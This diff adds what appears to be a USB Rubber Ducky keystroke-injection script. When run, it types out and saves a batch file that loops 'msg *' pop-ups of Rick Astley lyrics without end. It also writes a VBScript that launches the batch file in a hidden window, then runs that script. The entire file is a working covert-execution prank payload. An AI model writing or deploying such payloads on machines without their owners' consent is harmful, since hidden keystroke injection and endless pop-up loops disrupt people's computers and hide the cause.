@@ -1,0 +1,71 @@
+DELAY 2000
+
+GUI r
+DELAY 1000
+STRING notepad.exe
+ENTER
+DELAY 1000
+ENTER
+STRING @echo off
+ENTER
+STRING :a
+ENTER
+STRING msg * never gonna give u up
+ENTER
+STRING msg * never gonna let you dooooown
+ENTER
+STRING msg * never gonna give u up
+ENTER
+STRING msg * never gonna let you dooooown
+ENTER
+STRING msg * never gonna give u up
+ENTER
+STRING msg * never gonna let you dooooown
+ENTER
+STRING msg * never gonna give u up
+ENTER
+STRING msg * never gonna let you dooooown
+ENTER
+STRING msg * never gonna give u up
+ENTER
+STRING msg * never gonna let you dooooown
+ENTER
+STRING msg * never gonna give u up
+ENTER
+STRING msg * never gonna let you dooooown
+ENTER
+STRING Goto a
+DELAY 1000
+CTRL s
+DELAY 1000
+STRING leedle.bat
+ENTER
+DELAY 1000
+GUI m
+DELAY 1000
+GUI r
+DELAY 1000
+STRING notepad.exe
+ENTER
+DELAY 1000
+ENTER
+STRING Set oShell = CreateObject ("Wscript.Shell")
+ENTER
+STRING Dim strArgs
+ENTER
+STRING strArgs = "cmd /c leedle.bat"
+ENTER
+STRING oShell.Run strArgs, 0, false
+DELAY 1000
+CTRL s
+DELAY 1000
+STRING nocmd.vbs
+ENTER
+DELAY 1000
+GUI m
+DELAY 1000
+GUI
+DELAY 1000
+STRING nocmd.vbs
+ENTER
+DELAY 1000
